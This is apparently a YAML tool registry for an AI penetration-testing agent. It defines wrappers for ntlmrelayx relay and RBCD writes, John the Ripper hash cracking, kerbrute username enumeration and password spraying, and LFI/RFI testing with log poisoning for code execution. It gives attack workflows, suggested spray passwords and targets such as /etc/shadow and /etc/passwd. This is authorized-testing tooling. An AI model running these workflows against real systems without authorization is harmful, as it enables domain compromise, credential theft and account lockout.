  impacket-relay:
    name: impacket-relay
    version: '1.0'
    description: NTLM relay attacks via impacket ntlmrelayx. Listens for incoming NTLM authentication and relays it to a target
      service (LDAP, LDAPS, MSSQL, HTTP, SMB). Used for RBCD writes via relay, AD CS relay (ESC8), credential relay, and privilege
      escalation. Long-running service with start/stop/status process management.
    image: ghcr.io/silicon-works/mcp-tools-impacket-relay:latest
    image_size_mb: 900
    timeout_seconds: 600
    service: true
    service_name: impacket-relay
    capabilities:
    - ntlm_relay
    - rbcd_write
    - ad_compromise
    - credential_relay
    routing:
      use_for:
      - NTLM relay attacks
      - relay NTLM authentication to LDAP or LDAPS
      - RBCD via relay — relay coerced auth to write msDS-AllowedToActOnBehalfOfOtherIdentity
      - ntlmrelayx start listener for coerced authentication
      - relay coerced authentication from PetitPotam or WebDAV to target service
      - ESC8 AD CS relay — relay NTLM auth to certificate enrollment endpoint
      - cross-protocol relay from SMB/HTTP to LDAP
      never_use_for:
      - one-shot impacket commands like secretsdump, psexec, kerberoast (use impacket tool instead)
      - triggering authentication coercion (use PetitPotam, PrinterBug, or WebDAV coercion tools)
      - direct RBCD write without relay (use impacket.rbcd method instead)
      - password attacks or brute-forcing (use hydra)
      triggers:
      - ntlm relay
      - ntlmrelayx
      - relay to ldap
      - relay to ldaps
      - relay coerced
      - ntlm relay rbcd
      - relay delegate
    phases:
    - exploitation
    requirements:
      network: true
      privileged: true
    resources:
      memory_mb: 512
      cpu: 0.5
    see_also:
    - tool: impacket
      reason: Use impacket.addcomputer to create machine account before relay, impacket.get_st after RBCD write, impacket.rbcd
        for direct RBCD without relay
    - tool: certipy
      reason: For ADCS-specific attacks (ESC1-7) use certipy directly. impacket-relay handles ESC8 relay to HTTP enrollment.
    methods:
      start:
        required_ports:
        - 80
        - 445
        description: Start ntlmrelayx NTLM relay listener. Spawns ntlmrelayx as a background process, listening for incoming
          NTLM authentication and relaying it to the specified target. Returns a relay_id for status checking and stopping.
        when_to_use: 'When you need to relay coerced NTLM authentication to a target. Workflow: (1) start relay listener targeting
          LDAP/LDAPS/SMB, (2) coerce target via PetitPotam/PrinterBug/WebDAV, (3) check status for relay success, (4) stop
          relay. Use --delegate-access for automatic RBCD write after successful relay.'
        params:
          target:
            type: string
            required: true
            description: Relay target URL (e.g., 'ldaps://DC01.pirate.htb', 'smb://10.10.10.1', 'http://ca.corp.local/certsrv/certfnsh.asp')
          listen_port:
            type: integer
            default: 80
            description: Port to listen on for incoming NTLM auth (HTTP=80, SMB=445)
          smb2support:
            type: boolean
            default: true
            description: Enable SMB2 support for incoming connections
          delegate_access:
            type: boolean
            default: false
            description: Write RBCD delegation after successful relay (--delegate-access). Creates a machine account and sets
              msDS-AllowedToActOnBehalfOfOtherIdentity.
          escalate_user:
            type: string
            description: Account to escalate privileges for (--escalate-user)
          remove_mic:
            type: boolean
            default: false
            description: Remove MIC for cross-protocol relay (--remove-mic)
          additional_args:
            type: string
            description: Additional ntlmrelayx arguments as a single string
          timeout:
            type: integer
            default: 300
            description: Max time to keep relay running (seconds)
        returns:
          relay_id:
            type: string
            description: Relay process ID for use with status and stop methods
          pid:
            type: integer
            description: Process ID of ntlmrelayx
          status:
            type: string
            description: Process status (running, exited)
          target:
            type: string
            description: Relay target URL
          listen_port:
            type: integer
            description: Port listening for incoming NTLM auth
      status:
        description: Check status of a running relay and retrieve captured output. Returns connection attempts, relay success
          indicators, and any errors.
        when_to_use: After starting a relay, poll this to check if coercion has triggered and relay succeeded. Look for relay_succeeded=true
          and delegation_written=true (if --delegate-access was used).
        params:
          relay_id:
            type: string
            required: true
            description: Relay ID from start method
        returns:
          relay_id:
            type: string
            description: Relay process ID
          status:
            type: string
            description: Process status (running, completed, exited)
          relay_succeeded:
            type: boolean
            description: Whether NTLM relay was successful
          delegation_written:
            type: boolean
            description: Whether RBCD delegation was written (if --delegate-access)
          connections:
            type: array
            description: List of connection attempts received
          errors:
            type: array
            description: Any errors encountered
      stop:
        description: Stop a running relay and return final results including all captured output.
        when_to_use: After relay succeeds or to clean up. Always stop relays when done to free the listening port.
        params:
          relay_id:
            type: string
            required: true
            description: Relay ID to stop
        returns:
          relay_id:
            type: string
            description: Relay process ID
          status:
            type: string
            description: Always 'stopped'
          relay_succeeded:
            type: boolean
            description: Whether NTLM relay was successful
          delegation_written:
            type: boolean
            description: Whether RBCD delegation was written
          connections:
            type: array
            description: All connection attempts received
          errors:
            type: array
            description: All errors encountered
  john:
    name: john
    version: 1.9.0-jumbo-1
    description: 'Password hash cracking tool — John the Ripper 1.9.0-jumbo-1 (community-enhanced version) with AVX2 acceleration.
      Supports 300+ hash formats including md5crypt, sha512crypt, bcrypt, NTLM, LM, MySQL, MSSQL, Oracle, PostgreSQL, Kerberos,
      WPA, SSH keys, ZIP/RAR/PDF/Office. Includes ~300 *2john converter scripts (ssh2john, zip2john, pdf2john, office2john,
      etc.) for extracting crackable hashes from encrypted files. Cracking modes: wordlist (with mangling rules), incremental
      (brute-force), mask (pattern-based), single (username-derived), PRINCE (combination). Ships with rockyou.txt (14M passwords)
      and john''s built-in password.lst wordlist.'
    image: ghcr.io/silicon-works/mcp-tools-john:latest
    image_size_mb: 200
    timeout_seconds: 900
    capabilities:
    - password_cracking
    - hash_identification
    routing:
      use_for:
      - crack password hashes from /etc/shadow or database dumps
      - crack Windows NTLM LM hashes from SAM or secretsdump
      - crack MD5 SHA1 SHA256 SHA512 bcrypt hashes
      - crack Kerberos TGS tickets (kerberoasting)
      - crack SSH private key passphrases
      - crack ZIP RAR PDF Office encrypted file passwords
      - identify unknown hash format type
      - offline password cracking with wordlists
      - recover plaintext from password hashes
      - crack MySQL PostgreSQL Oracle database password hashes
      never_use_for:
      - task: IKE/IPsec PSK hash cracking
        use_instead: ike-scan.crack_psk
        reason: John does not support psk-ike format. Use ike-scan's built-in crack_psk method which uses psk-crack.
      - task: VPN PSK cracking
        use_instead: ike-scan.crack_psk
        reason: IKE PSK hashes require psk-crack, not John the Ripper
      - online brute-forcing (use hydra)
      - network authentication testing (use hydra)
      triggers:
      - crack password
      - hash crack
      - shadow file
      - ntlm
      - john
      - john the ripper
      - rockyou
      - kerberoast
      - hashcat
      prefer_over: []
    see_also:
    - tool: responder
      reason: Use responder to capture NTLMv2 hashes via LLMNR/NBT-NS poisoning — feed captured hashes to john for cracking.
    - tool: hashcat
      reason: 'Use hashcat for advanced cracking modes: combinator attacks (-a 1), hybrid attacks (-a 6/-a 7), custom charsets,
        and GPU acceleration.'
    phases:
    - post-exploitation
    requirements:
      network: false
      privileged: false
    resources:
      memory_mb: 1024
      cpu: 2.0
    methods:
      crack:
        description: Crack password hashes using john's wordlist mode with optional mangling rules. Writes hashes to a temp
          file, runs john with the specified wordlist and format, then runs john --show to collect cracked results. Uses AVX2
          acceleration when available. The 'rockyou' wordlist (14M passwords) is the default and cracks most weak passwords.
          With rules enabled (default), john applies word mangling transformations (capitalization, number appending, leet
          speak, etc.) which dramatically increases coverage. John stores cracked passwords in ~/.john/john.pot — subsequent
          calls for the same hash return instantly from the pot file.
        when_to_use: 'After extracting password hashes from any source: /etc/shadow (Linux), SAM/NTDS.dit/secretsdump (Windows),
          database dumps (MySQL, PostgreSQL, MSSQL), web application databases, Kerberos tickets (kerberoasting). Always specify
          the format if you know it — auto-detection works but can be slow or wrong with ambiguous hashes. Common workflow:
          (1) Extract hashes (e.g., from /etc/shadow, sqlmap dump, impacket secretsdump), (2) Identify format if unsure, (3)
          Crack with rockyou, (4) If no results, try ''common'' wordlist (john''s password.lst) with rules for faster iteration.
          For bcrypt/scrypt hashes, expect very slow cracking (minutes per password) — reduce timeout expectations. For simple
          MD5/SHA hashes, rockyou with rules cracks most weak passwords in under a minute.'
        params:
          hashes:
            type: string
            required: true
            description: 'Hash(es) to crack, one per line. Supports multiple formats: bare hash (''5f4dcc3b5aa765d61d8327deb882cf99''),
              user:hash (''admin:$6$rounds=5000$...''), /etc/shadow format (''root:$6$salt$hash:...''). For multiple hashes,
              separate with newlines. John auto-detects the format from the hash structure.'
          format:
            type: string
            default: auto
            description: 'Hash format name. ''auto'' attempts detection (may fail for raw/ambiguous hashes). Common formats:
              ''raw-md5'' (unsalted MD5), ''raw-sha1'', ''raw-sha256'', ''raw-sha512'', ''md5crypt'' ($1$), ''sha256crypt''
              ($5$), ''sha512crypt'' ($6$, Linux /etc/shadow), ''bcrypt'' ($2a$/$2b$), ''ntlm'' (Windows), ''lm'' (legacy
              Windows), ''mysql'' (MySQL 4.1+), ''mssql'' (SQL Server), ''descrypt'' (DES crypt), ''ssh'' (SSH key passphrase
              via ssh2john), ''zip''/''rar''/''pdf'' (encrypted files via *2john). John supports 300+ formats total — use
              identify method to determine the correct format.'
          wordlist:
            type: string
            default: rockyou
            description: 'Wordlist name or path. Built-in: ''rockyou'' (/usr/share/wordlists/rockyou.txt, ~14M passwords —
              comprehensive, default), ''common'' (/usr/share/john/password.lst, ~3K passwords — fast). Or provide an absolute
              path to a custom wordlist.'
          rules:
            type: boolean
            default: true
            description: 'Apply john''s word mangling rules (--rules). Transforms each wordlist entry through ~100 rules:
              capitalize, append numbers (password1, password123), leet speak (p@ssw0rd), reverse, etc. Increases effective
              wordlist size by ~100x. Enabled by default. Disable for raw wordlist-only testing (faster but less coverage).'
          timeout:
            type: integer
            default: 300
            description: 'Maximum cracking time in seconds. Default 300s (5 min). For MD5/SHA with rockyou: 1-2 minutes is
              usually enough. For bcrypt ($2a$, cost 10+): each hash takes ~0.01s to test, so 14M wordlist takes ~40 hours
              — use ''common'' wordlist instead. For NTLM: very fast, 300s is more than enough for rockyou.'
          mask:
            type: string
            description: 'Mask pattern for targeted cracking (alternative to wordlist). Placeholders: ?l=lowercase, ?u=uppercase,
              ?d=digit, ?s=special, ?a=all printable. Examples: ''?u?l?l?l?d?d?d?d'' (Name1234), ''Company?d?d?d?d'' (Company
              + 4 digits), ''?d?d?d?d'' (4-digit PIN). Overrides wordlist if provided. Much faster than wordlist for known
              password patterns.'
          incremental:
            type: boolean
            default: false
            description: Use incremental (brute-force) mode — tries all character combinations. Very slow but guaranteed to
              find the password eventually. Only practical for short passwords (8 chars or less). Overrides both wordlist
              and mask.
          fork:
            type: integer
            description: Number of processes to fork for parallel cracking (--fork=N). Set to number of CPU cores for maximum
              speed. Most useful for slow hash types like bcrypt and scrypt where each attempt is expensive.
        returns:
          cracked:
            type: array
            description: 'Cracked results. Each entry: {user: ''username'', password: ''plaintext''}. Empty array if nothing
              cracked.'
          count:
            type: integer
            description: Number of passwords cracked
          format:
            type: string
            description: Hash format used
          mode:
            type: string
            description: 'Cracking mode used: ''wordlist'', ''mask'', or ''incremental'''
          wordlist:
            type: string
            description: Full path to wordlist used (only present in wordlist mode)
          mask:
            type: string
            description: Mask pattern used (only present in mask mode)
      show:
        description: 'Show previously cracked passwords from john''s pot file (~/.john/john.pot). John caches all cracked
          passwords persistently — this retrieves results without re-cracking. Writes the hashes to a temp file, runs john
          --show, and parses the output. Useful for: (1) checking if hashes were already cracked in a previous crack call,
          (2) retrieving results after a timeout, (3) checking the pot file after manual cracking.'
        when_to_use: After a crack attempt (especially one that timed out) to check what was cracked. Also use when you have
          the same hashes and want to see if they were cracked in a previous session. John's pot file persists across calls
          within the same container session, so all previously cracked passwords are retrievable. If crack returns 0 results
          but you suspect it worked (e.g., you saw progress in raw_output), call show to check the pot file.
        params:
          hashes:
            type: string
            required: true
            description: Hash(es) to check, same format as the crack method. Must match what was originally passed to crack
              (john matches by hash value in the pot file).
          format:
            type: string
            default: auto
            description: Hash format. Should match the format used in the crack call. If 'auto' was used for cracking, use
              'auto' here too.
        returns:
          cracked:
            type: array
            description: 'Previously cracked results from the pot file. Each entry: {user: ''username'', password: ''plaintext''}'
          count:
            type: integer
            description: Number of cracked passwords found in pot file
      identify:
        description: Identify the format of an unknown hash using pattern matching and john format probing. First checks against
          16 common hash patterns (md5crypt, sha256crypt, sha512crypt, bcrypt, phpass, argon2, SSHA, raw-MD5/NTLM, raw-SHA1,
          raw-SHA256, raw-SHA512, MySQL, etc.). If no pattern matches, falls back to probing 8 john formats. Returns a list
          of possible format names.
        when_to_use: When you have a hash but don't know its format — e.g., found a hash in a config file, database, or web
          application and need to determine the correct john format name before cracking. Pattern matching handles most common
          formats instantly. If this method returns 'unknown', try the hash-lookup tool or check hash format references online.
          For hashes from specific sources (MySQL, PostgreSQL, etc.), the format is usually known from context.
        params:
          hash:
            type: string
            required: true
            description: Single hash to identify. Can be a bare hash ('5f4dcc3b5aa765d61d8327deb882cf99') or in user:hash
              format ('admin:$6$salt$hash'). Only provide ONE hash — multiple hashes may confuse the detection.
        returns:
          possible_formats:
            type: array
            description: List of john format names that accepted the hash (e.g., ['raw-md5', 'ntlm']). 'unknown' if no format
              matched. Multiple matches are common for ambiguous hashes (e.g., 32 hex chars matches both raw-md5 and ntlm).
      convert:
        description: Extract a crackable hash from an encrypted file using john's *2john converter scripts. Supports 24 file
          types including SSH keys, ZIP/RAR/7z archives, PDF/Office documents, password managers (KeePass, Bitwarden, LastPass,
          1Password), crypto wallets (Bitcoin, Ethereum), disk encryption (TrueCrypt, LUKS, BitLocker, DMG), and more. The
          output hash can be passed directly to the crack method.
        when_to_use: 'When you have an encrypted file and need to crack its password. Common scenarios: (1) Found an encrypted
          SSH private key — use file_type=''ssh'' to extract the hash, then crack it. (2) Found a password-protected ZIP file
          — use file_type=''zip''. (3) Found a KeePass database — use file_type=''keepass''. (4) Found an Ansible vault —
          use file_type=''ansible''. The workflow is always: convert → crack. The file must be accessible inside the container
          (mount via session directory).'
        params:
          file_path:
            type: string
            required: true
            description: 'Path to the encrypted file inside the container. Files from the session working directory are mounted
              at /session/. Examples: ''/session/id_rsa'', ''/session/backup.zip'', ''/session/vault.kdbx''.'
          file_type:
            type: enum
            required: true
            values:
            - ssh
            - zip
            - rar
            - pdf
            - office
            - 7z
            - keepass
            - gpg
            - bitcoin
            - ethereum
            - truecrypt
            - luks
            - ansible
            - bitwarden
            - lastpass
            - 1password
            - keychain
            - pfx
            - mozilla
            - telegram
            - signal
            - dmg
            - bitlocker
            description: Type of encrypted file — determines which *2john converter to use. ssh=SSH private key, zip=ZIP archive,
              rar=RAR archive, pdf=PDF document, office=MS Office (Word/Excel/PowerPoint), 7z=7-Zip archive, keepass=KeePass
              database (.kdbx), gpg=GPG encrypted file, bitcoin/ethereum=crypto wallets, truecrypt/luks/bitlocker/dmg=disk
              encryption, ansible=Ansible vault, bitwarden/lastpass/1password=password manager exports, keychain=macOS keychain,
              pfx=PKCS#12 certificate, mozilla=Firefox/Thunderbird profiles, telegram/signal=messaging app data.
        returns:
          hash:
            type: string
            description: Extracted hash in john-compatible format. Pass this directly to crack method's 'hashes' parameter.
          file:
            type: string
            description: Original file path
          converter:
            type: string
            description: Name of the *2john converter script used (e.g., 'ssh2john.py', 'zip2john')
          file_type:
            type: string
            description: File type that was converted
  kerbrute:
    name: kerbrute
    version: 1.0.3
    description: 'Kerberos username enumeration and password spraying tool — kerbrute v1.0.3 (ropnop/kerbrute, Go binary).
      Four methods: userenum, passwordspray, bruteforce, bruteuser. Discovers valid Active Directory usernames by sending
      AS-REQ packets to port 88 and analyzing KDC error codes — KDC_ERR_C_PRINCIPAL_UNKNOWN means the user does not exist,
      KDC_ERR_PREAUTH_REQUIRED means the user IS valid (pre-authentication needed), KDC_ERR_CLIENT_REVOKED means the account
      is locked or disabled. Does NOT require any credentials for username enumeration (unlike LDAP-based enumeration which
      needs a bind account). Supports multi-threaded operation (default 10 threads, configurable via --threads), rate-limiting
      via --delay, and --safe mode that aborts on first lockout detection. WARNING from kerbrute: failed Kerberos pre-auth
      counts as a failed login and WILL lock out accounts — use --safe and --delay in production environments. Operates entirely
      over Kerberos (port 88) — does not touch SMB (445), LDAP (389), or RPC (135). For Kerberoasting or AS-REP roasting after
      finding valid users, use impacket instead.'
    image: ghcr.io/silicon-works/mcp-tools-kerbrute:latest
    image_size_mb: 194
    timeout_seconds: 300
    capabilities:
    - username_enumeration
    - password_spraying
    - kerberos_authentication
    routing:
      use_for:
      - enumerate valid Active Directory usernames without credentials
      - discover valid domain users via Kerberos AS-REQ responses on port 88
      - spray a single password against multiple AD users to find valid logins
      - test username:password combinations against a Kerberos KDC
      - find valid accounts on a domain controller before further AD attacks
      - pre-authentication username enumeration without touching SMB or LDAP
      - brute-force a single Active Directory user's password from a wordlist
      - check which usernames exist in an AD domain without any credentials
      - password spraying attack against Windows domain with lockout awareness
      - validate a list of potential usernames against a domain controller
      - try each username as its own password across the domain (user-as-pass spray)
      never_use_for:
      - kerberoasting (use impacket.kerberoast — kerbrute does not request TGS tickets, it only does pre-auth)
      - AS-REP roasting (use impacket.asreproast — kerbrute does not check for accounts with DONT_REQUIRE_PREAUTH)
      - LDAP user enumeration (use impacket.get_ad_users or netexec — requires valid bind creds but returns richer data)
      - SMB brute-force (use hydra — kerbrute only speaks Kerberos on port 88)
      - online web login brute-force (use hydra)
      - hash cracking offline (use john or hashcat)
      - RDP brute-force (use hydra)
      triggers:
      - kerbrute
      - kerberos enum
      - kerberos brute
      - username enumeration
      - password spray
      - AD user enum
      - port 88
      - domain user discovery
      - bruteuser
      - user-as-pass
    phases:
    - enumeration
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.5
    see_also:
    - tool: impacket
      reason: After finding valid users with kerbrute, use impacket for kerberoasting (GetUserSPNs), AS-REP roasting (GetNPUsers),
        or secretsdump
    - tool: bloodhound
      reason: After confirming valid creds via password spray, collect AD relationships with bloodhound
    - tool: netexec
      reason: Validate found credentials across multiple protocols (SMB, WinRM, LDAP, MSSQL)
    - tool: hydra
      reason: For non-Kerberos brute-force — SMB, RDP, SSH, HTTP, FTP, etc.
    - tool: enum4linux-ng
      reason: Use enum4linux-ng for SMB/RPC-based user enumeration when you have credentials or null sessions. Kerbrute discovers
        users without credentials via Kerberos.
    methods:
      userenum:
        description: 'Enumerate valid AD usernames by sending Kerberos AS-REQ packets to the domain controller on port 88.
          For each username, kerbrute sends a pre-authentication request and classifies the KDC response: KDC_ERR_C_PRINCIPAL_UNKNOWN
          means the user does not exist, KDC_ERR_PREAUTH_REQUIRED means the user IS valid (pre-auth needed), and KDC_ERR_CLIENT_REVOKED
          means the account is locked/disabled. No credentials required — this is unauthenticated enumeration. Internally:
          writes usernames to a temp file, runs `kerbrute userenum --dc <dc> -d <domain> -v -t <threads> [--delay <ms>] [--safe]
          <file>`, parses stdout for `[+] VALID USERNAME:` lines, cleans up temp file.'
        when_to_use: (1) First step in AD enumeration when you have no credentials — test common usernames (administrator,
          guest, krbtgt, svc-*, admin) against the DC. (2) After discovering a domain name from DNS, SMB, or LDAP, validate
          a custom wordlist of potential users. (3) Before password spraying — enumerate valid users first to avoid wasting
          spray attempts on nonexistent accounts and triggering lockouts. (4) When LDAP anonymous bind is disabled and you
          cannot use impacket.get_ad_users or netexec --users. (5) Output valid_users list feeds directly into passwordspray
          or impacket.asreproast.
        required_ports:
        - 88
        params:
          dc:
            type: string
            required: true
            description: 'IP address of the domain controller (must have port 88/Kerberos open). Use the DC IP from nmap service
              scan — look for ''kerberos-sec'' on port 88. Examples: ''10.10.10.100'', ''192.168.1.1''.'
          domain:
            type: string
            required: true
            description: 'Full AD domain name, used as the Kerberos realm (automatically uppercased internally). Case-insensitive.
              Examples: ''corp.local'', ''megabank.local'', ''htb.local''. Found via: nmap LDAP scripts, SMB null session,
              DNS SRV records, or ldapsearch.'
          usernames:
            type: string
            required: true
            description: 'Newline-separated list of usernames to test (bare names without @domain suffix). Common starter
              list: ''administrator\nguest\nkrbtgt\nadmin\nservice\nsql_svc\nweb_svc\nbackup''. For larger enumeration, use
              SecLists xato-net-10-million-usernames or custom wordlists. Each username is tested individually via AS-REQ.'
          threads:
            type: integer
            default: 10
            description: 'Number of concurrent goroutines (kerbrute default: 10). Reduce to 1-2 for stealth or if lockout
              policies are aggressive. Ignored when delay is set (forces single-thread).'
          delay:
            type: integer
            description: Delay in milliseconds between each attempt. When set, forces single-threaded mode regardless of threads
              value. Use 500-1000ms to avoid detection by SIEM, or longer if lockout threshold is tight. Omit for maximum
              speed.
          safe:
            type: boolean
            default: false
            description: Safe mode (--safe flag) — abort immediately if any account comes back as locked out. Prevents cascading
              lockouts across the domain. Recommended when lockout policy is unknown.
          timeout:
            type: integer
            default: 120
            description: Maximum execution time in seconds. 120s handles ~10K usernames at default speed. Increase for large
              lists or when using delay.
        returns:
          valid_users:
            type: array
            description: Usernames confirmed valid by KDC (received KDC_ERR_PREAUTH_REQUIRED response). Each element is a
              bare username string without domain suffix (e.g., 'administrator', 'svc-sql'). Feed these into passwordspray
              or impacket.asreproast.
          valid_count:
            type: integer
            description: Number of valid usernames found
          invalid_users:
            type: array
            description: Usernames confirmed invalid by KDC (received 'User does not exist' response). Useful for narrowing
              down wordlists.
          locked_users:
            type: array
            description: Accounts flagged as locked/disabled by KDC ('USER LOCKED OUT' response, possibly with 'safe mode
              on! Aborting...'). These accounts exist but should NOT be sprayed — they would trigger immediate lockout alerts.
          locked_count:
            type: integer
            description: Number of locked accounts detected
          total_tested:
            type: integer
            description: Total usernames tested (parsed from kerbrute's 'Done! Tested N usernames' summary line, falls back
              to input line count)
          errors:
            type: array
            description: 'Network or KDC errors encountered during enumeration. Null when no errors occurred. Common: ''Can\''t
              talk to KDC'' (DC unreachable), ''KDC ERROR - Wrong Realm'' (wrong domain name), encoding errors (port 88 open
              but not Kerberos).'
      passwordspray:
        description: 'Test a single password against multiple usernames via Kerberos AS-REQ pre-authentication. Sends one
          authentication attempt per user, which is safer than brute-forcing a single account (avoids rapid-fire attempts
          that trigger lockout). The KDC response distinguishes: valid login (AS-REP with TGT), invalid password (KDC_ERR_PREAUTH_FAILED),
          and locked account (KDC_ERR_CLIENT_REVOKED). Supports --user-as-pass mode which also tries each username as its
          own password. Internally: writes usernames to temp file, runs `kerbrute passwordspray --dc <dc> -d <domain> -v [--user-as-pass]
          [--safe] <file> <password>`, parses `[+] VALID LOGIN:` lines.'
        when_to_use: (1) After userenum returns valid_users — spray the most common passwords (Season+Year like 'Winter2025!',
          'CompanyName1!', 'Password1') against all confirmed users. (2) When you suspect a default or shared password across
          the domain. (3) Safer than bruteforce/bruteuser for avoiding account lockout — one attempt per user per spray round.
          (4) Run multiple spray rounds with different passwords (wait between rounds to respect lockout policies — typically
          30 min). (5) Use user_as_pass=true to check for trivially weak accounts. (6) Valid logins can be used immediately
          with impacket, evil-winrm, or bloodhound.
        required_ports:
        - 88
        params:
          dc:
            type: string
            required: true
            description: Domain controller IP address (port 88 must be open).
          domain:
            type: string
            required: true
            description: Full AD domain name (e.g., 'corp.local').
          usernames:
            type: string
            required: true
            description: 'Newline-separated usernames to spray. Best practice: use the valid_users output from a prior userenum
              call to avoid testing nonexistent accounts and wasting lockout budget.'
          password:
            type: string
            required: true
            description: 'Single password to test against all users. Common spray candidates for HTB: ''Password1'', ''Welcome1'',
              ''<Season><Year>!'' (e.g., ''Spring2026!''), ''<CompanyName>1!'', ''Changeme1''. Only ONE password per spray
              call — run multiple calls for multiple passwords with appropriate delays.'
          user_as_pass:
            type: boolean
            default: false
            description: Also try each username as its own password (kerbrute --user-as-pass flag). Catches accounts where
              password equals username (surprisingly common in enterprise). Works alongside the password argument — both the
              specified password and user-as-pass are tried.
          threads:
            type: integer
            default: 10
            description: Concurrent threads. Reduce for stealth. Ignored when delay is set.
          delay:
            type: integer
            description: Delay in milliseconds between each attempt. Forces single-threaded. Use to space out attempts and
              avoid lockout.
          safe:
            type: boolean
            default: false
            description: Abort immediately if any account is locked. Recommended for password spraying.
          timeout:
            type: integer
            default: 120
            description: Maximum execution time in seconds.
        returns:
          valid_logins:
            type: array
            description: 'Successful authentications. Each entry: {username: ''user'', password: ''pass''}. Empty array if
              no valid logins found. Feed valid creds to impacket, evil-winrm, or bloodhound.'
          valid_count:
            type: integer
            description: Number of valid logins found
          failed_count:
            type: integer
            description: Number of failed authentication attempts (verbose [-] lines)
          locked_users:
            type: array
            description: Accounts that returned locked/disabled status during spray. Stop spraying these.
          total_tested:
            type: integer
            description: Total authentication attempts (parsed from 'Done! Tested N logins' line)
          password_tested:
            type: string
            description: The password that was sprayed, or '(user-as-pass)' if only user_as_pass was used
          errors:
            type: array
            description: Network/KDC errors. Null when no errors. 'Can\'t talk to KDC' means DC unreachable.
      bruteforce:
        description: 'Test specific username:password combinations via Kerberos AS-REQ. Unlike passwordspray (one password
          across many users), bruteforce accepts explicit user:pass pairs — each line in the combo list is an independent
          authentication attempt. Useful when you have credential dumps, leaked passwords, or targeted guesses for specific
          accounts. WARNING: multiple attempts against the same user WILL count toward lockout. Internally: writes combos
          to temp file, runs `kerbrute bruteforce --dc <dc> -d <domain> -v [--safe] <file>`, parses `[+] VALID LOGIN:` lines.'
        when_to_use: (1) When you have specific username:password guesses from OSINT, credential dumps, or password reuse
          patterns. (2) Testing credentials found in config files, scripts, or documentation against AD. (3) When you need
          to verify multiple different passwords for different users simultaneously. (4) After finding passwords in a database
          dump — test them against AD accounts for password reuse.
        required_ports:
        - 88
        params:
          dc:
            type: string
            required: true
            description: Domain controller IP address (port 88).
          domain:
            type: string
            required: true
            description: Full AD domain name.
          combos:
            type: string
            required: true
            description: 'Newline-separated username:password pairs. Format: ''user1:pass1\nuser2:pass2\nadmin:Password1''.
              Each line is one authentication attempt. WARNING: if same username appears multiple times, each counts toward
              that account''s lockout threshold.'
          threads:
            type: integer
            default: 10
            description: Concurrent threads. Reduce for stealth.
          delay:
            type: integer
            description: Delay in ms between attempts. Forces single-threaded.
          safe:
            type: boolean
            default: false
            description: Abort on first lockout detection.
          timeout:
            type: integer
            default: 120
            description: Maximum execution time in seconds.
        returns:
          valid_logins:
            type: array
            description: 'Successful pairs. Each entry: {username: ''user'', password: ''pass''}.'
          valid_count:
            type: integer
            description: Number of valid logins found
          failed_count:
            type: integer
            description: Number of failed attempts
          locked_users:
            type: array
            description: Accounts that returned locked/disabled status
          total_tested:
            type: integer
            description: Total combinations tested
          errors:
            type: array
            description: Network/KDC errors. Null when none.
      bruteuser:
        description: 'Brute-force a single user''s password from a wordlist via Kerberos pre-authentication. Tests every password
          in the list against one specific account. WARNING from kerbrute: ''only run this if there\''s no lockout policy!''
          — each failed attempt counts toward that account''s lockout threshold. Internally: writes passwords to temp file,
          runs `kerbrute bruteuser --dc <dc> -d <domain> -v [--safe] <file> <username>`, parses `[+] VALID LOGIN:` lines.'
        when_to_use: '(1) When you have a known high-value username (e.g., ''administrator'', ''svc-sql'') and want to try
          a wordlist against it. (2) When lockout policy is confirmed as disabled or very lenient (e.g., 100+ attempts). (3)
          After userenum found valid users and password spray failed — escalate to targeted brute-force. (4) DANGEROUS: use
          --safe and --delay to minimize lockout risk. Prefer passwordspray (one password, many users) when lockout policy
          is in effect.'
        required_ports:
        - 88
        params:
          dc:
            type: string
            required: true
            description: Domain controller IP address (port 88).
          domain:
            type: string
            required: true
            description: Full AD domain name.
          username:
            type: string
            required: true
            description: 'Single username to brute-force (without @domain). Example: ''administrator'', ''svc-sql''.'
          passwords:
            type: string
            required: true
            description: 'Newline-separated list of passwords to try against the user. Common wordlists: rockyou top-1000,
              common enterprise passwords. Example: ''Password1\nWelcome1\nAdmin123\nChangeme1''.'
          threads:
            type: integer
            default: 10
            description: Concurrent threads. Reduce to 1 with delay for safety.
          delay:
            type: integer
            description: Delay in ms between attempts. Highly recommended for bruteuser to avoid lockout.
          safe:
            type: boolean
            default: false
            description: Abort if account becomes locked. STRONGLY recommended for bruteuser.
          timeout:
            type: integer
            default: 120
            description: Maximum execution time in seconds.
        returns:
          valid_logins:
            type: array
            description: 'Successful login if found. Entry: {username: ''<target>'', password: ''<found_pass>''}. Empty if
              no password worked.'
          valid_count:
            type: integer
            description: 1 if password found, 0 if not
          failed_count:
            type: integer
            description: Number of failed password attempts
          locked_users:
            type: array
            description: Contains the target username if it became locked during brute-force
          total_tested:
            type: integer
            description: Total passwords tested
          target_user:
            type: string
            description: The username that was brute-forced
          errors:
            type: array
            description: Network/KDC errors. Null when none.
  lfi-rfi:
    name: lfi-rfi
    version: '1.0'
    description: 'Local File Inclusion (LFI) and Remote File Inclusion (RFI) testing and exploitation tool. 5 methods: test_lfi
      (automated directory traversal with multiple encodings and depths), test_rfi (remote URL inclusion with PHP wrappers),
      read_file (extract specific files via confirmed LFI), php_filter (read PHP source code via php://filter/convert.base64-encode),
      log_poison (inject PHP code into log files via User-Agent/Referer/X-Forwarded-For headers for RCE). Supports Linux and
      Windows path traversal patterns. Uses {PAYLOAD} placeholder in URLs. Authenticated testing via cookies.'
    image: ghcr.io/silicon-works/mcp-tools-lfi-rfi:latest
    image_size_mb: 100
    timeout_seconds: 300
    capabilities:
    - lfi_testing
    - rfi_testing
    - path_traversal
    - php_filters
    - log_poisoning
    phases:
    - enumeration
    - exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 128
      cpu: 0.5
    routing:
      use_for:
      - test URL parameter for Local File Inclusion with path traversal
      - read arbitrary files on web server via LFI vulnerability
      - read PHP source code via php://filter wrapper
      - test for Remote File Inclusion vulnerability
      - achieve RCE via LFI combined with log poisoning
      - directory traversal testing with multiple encodings
      never_use_for:
      - SQL injection
      - directory enumeration
      - port scanning
      triggers:
      - file inclusion
      - path traversal
      - LFI
      - RFI
      - php filter
      - log poison
      - ../
      prefer_over: []
    methods:
      test_lfi:
        description: Test a URL parameter for Local File Inclusion by trying path traversal sequences (../) at multiple depths
          with multiple encodings (plain, URL-encoded, double-URL-encoded, null byte, etc.). Tries to read /etc/passwd (Linux)
          or C:\Windows\win.ini (Windows) as proof of concept. Uses {PAYLOAD} placeholder in the URL.
